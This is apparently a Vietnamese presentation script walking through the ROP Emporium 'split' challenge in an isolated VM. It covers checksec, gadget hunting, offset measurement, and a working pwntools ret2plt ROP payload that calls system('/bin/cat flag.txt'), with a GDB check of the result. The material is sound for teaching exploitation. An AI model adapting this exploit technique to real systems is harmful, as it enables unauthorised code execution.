# Bản chạy demo S05 từ đầu đến cuối — `split` x86_64 (Kali amd64)

Chạy trong VM cô lập. Số liệu dưới đây đã xác minh 2026-11-05 (xem
[ket_qua_demo.md](ket_qua_demo.md)); "Thấy" = output kỳ vọng để đối chiếu.
Khung lớn: cả demo trả lời 3 câu hỏi nối tiếp rồi ghép lại thành payload —
**(1) được phép lái kiểu nào? → (2) vô-lăng ở đâu? → (3) lái tới đâu?**

## Giới thiệu challenge — NÓI trước khi mở terminal (≈1 phút, slide 7)
"Người xem phải biết đang xem cái gì." Các ý cần nói:
- **`split` — challenge của ROP Emporium**: nền tảng học ROP miễn phí, hợp pháp,
  chạy trong VM cô lập (đúng yêu cầu đề: challenge CTF Pwnable được cấp phép).
- **Mục tiêu:** đọc nội dung `flag.txt` — thứ chương trình bình thường không cho xem.
- **Tên "split":** binary cố tình để sẵn **hai mảnh** cho một câu lệnh — một lời gọi
  `system()` và một chuỗi `"/bin/cat flag.txt"` — nhưng **bị tách rời**. Việc của ta là
  **ghép lại** bằng điều khiển luồng (ROP). Đó là ret2libc thu nhỏ.
- **Chương trình làm gì:** xin input → đọc input vào buffer trên stack → chỗ có lỗi tràn.
- **Vì sao hợp chủ đề:** NX bật → không shellcode được → buộc tái sử dụng `system` có sẵn.

Minh hoạ nhanh "mục tiêu có thật" (không spoil): cho thấy binary và flag tồn tại, nhưng
để exploit mới lộ nội dung.
```bash
file split            # đây là binary ta tấn công
ls -l flag.txt        # muc tieu: lam chuong trinh tu doc file nay ra (chua cat voi)
```

## Bước 0 — vào đúng chỗ
```bash
cd ~/s05_split
ls -l split flag.txt exploit.py
```

## Bước 1 — "được phép lái kiểu nào?" (checksec + ASLR) → ảnh 01
```bash
checksec --file=split
cat /proc/sys/kernel/randomize_va_space
```
Thấy: `NX enabled` · `No PIE (0x400000)` · `No canary` · ASLR=`2`.
Nghĩa: NX → không shellcode → tái sử dụng mã; No canary → ghi thẳng tới saved RIP;
No PIE → địa chỉ cố định. Chốt: **ret2plt**.

## Bước 2 — hành vi bình thường (MỐC ĐỐI CHIẾU, không phải bằng chứng lỗi) → ảnh 02
```bash
echo "hello" | ./split
```
Chứng minh gì: CHỈ là "ảnh trước" — input ngắn → chạy êm, không crash, không flag; và
chỉ ra đúng cổng nhập liệu sẽ bị tấn công. KHÔNG chứng minh có lỗ hổng (lỗi hiện ở
bước crash/đo offset). Có thể chạy liền input dài để tương phản:
```bash
python3 -c "print('A'*100)" | ./split; echo "exit=$?"   # input dai -> crash (segfault)
```

## Bước 3 — "nguyên liệu" có sẵn trong binary → ảnh 03
```bash
objdump -d split | grep -A1 "<system@plt>:" | head   # ham de goi -> system@plt
ROPgadget --binary split | grep "pop rdi ; ret"       # gadget dat doi so -> RDI
ROPgadget --binary split --string "/bin/cat flag.txt" # con tro doi so
```
Thấy: `system@plt=0x400560`; `pop rdi ; ret=0x4007c3`; chuỗi tại `0x601060`.
Nghĩa: thu 3 "tọa độ đích" (câu hỏi 3). Cố định được nhờ No PIE (Bước 1). Đây chính là
3 giá trị `exploit.py` tự lấy qua `elf.plt`/`rop.find_gadget`/`elf.symbols` — Bước 3 là
bản "làm tay cho người xem thấy nguồn gốc các số".

## Bước 4 — "vô-lăng ở đâu?" (đo offset) → ảnh 04
```bash
ulimit -c unlimited
python3 exploit.py offset
```
Thấy: `Offset tới saved RIP = 40` (RIP crash = 0x6161616c6161616b = "kaaalaaa").
Nghĩa: 40 byte từ đầu input là tới saved return address. Đo trên binary này, không đoán.

## Bước 5 — cho người xem THẤY file exploit, rồi chạy ra flag
```bash
# 5a) mở exploit cho khan gia doc. --paging=never de KHONG mo pager (tranh "treo"/dung hinh).
batcat --paging=never exploit.py 2>/dev/null || cat -n exploit.py
# 5b) chay
python3 exploit.py
```
Nghĩa 5a: minh bạch — người xem đọc đúng thứ sắp chạy, và thấy cấu trúc payload khớp
phần giải thích (dùng số dòng để chỉ: dòng `pop rdi`, dòng `system@plt`...).
Thấy 5b: in địa chỉ rồi ra `ROPE{a_placeholder_32byte_flag!}`. Ctrl+C để thoát.
Payload = `A`*40 + ret(0x40053e, căn lề) + `pop rdi;ret`(0x4007c3) + 0x601060 + system@plt(0x400560).

## Bước 6 — chạy lặp 2 lần → ảnh 06 + run_log.txt
```bash
for i in 1 2; do echo "===== RUN $i ====="; python3 -c "
from pwn import *
context.log_level='warn'
elf=context.binary=ELF('./split'); rop=ROP(elf)
payload=b'A'*40+p64(rop.find_gadget(['ret'])[0])+p64(rop.find_gadget(['pop rdi','ret'])[0])+p64(elf.symbols['usefulString'])+p64(elf.plt['system'])
p=process('./split'); p.sendline(payload); print(p.recvall(timeout=3).decode(errors='replace'))
"; done | tee run_log.txt
grep -c "ROPE{" run_log.txt   # phải ra 2
```

## Bước 7 — nhìn tận mắt trong GDB (đối số đúng) → ảnh 05
```bash
python3 -c "
from pwn import *
context.arch='amd64'; elf=ELF('./split'); rop=ROP(elf)
payload=b'A'*40+p64(rop.find_gadget(['ret'])[0])+p64(rop.find_gadget(['pop rdi','ret'])[0])+p64(elf.symbols['usefulString'])+p64(elf.plt['system'])
open('payload.bin','wb').write(payload)"
gdb -q -batch -ex "break system" -ex "run < payload.bin" \
  -ex 'x/s $rdi' -ex 'info registers rdi rsp rip' ./split
```
Thấy: `0x601060 <usefulString>: "/bin/cat flag.txt"`, `RDI=0x601060`, dừng `in system ()`.
`rsp` tận cùng …8 → thỏa `RSP%16==8` ở cửa vào hàm → ret căn lề đã đúng.

## Phân biệt mức bằng chứng (bắt buộc khi thuyết trình)
ghi vượt → crash → chiếm luồng (RIP ta đặt) → gọi system đúng đối số (RDI trỏ chuỗi)
→ đạt mục tiêu CTF (flag). Dùng `system@plt` cố định (No PIE) **không** chứng minh
tìm libc base / vượt ASLR — địa chỉ libc chỉ thấy trong GDB vì GDB tắt ASLR.
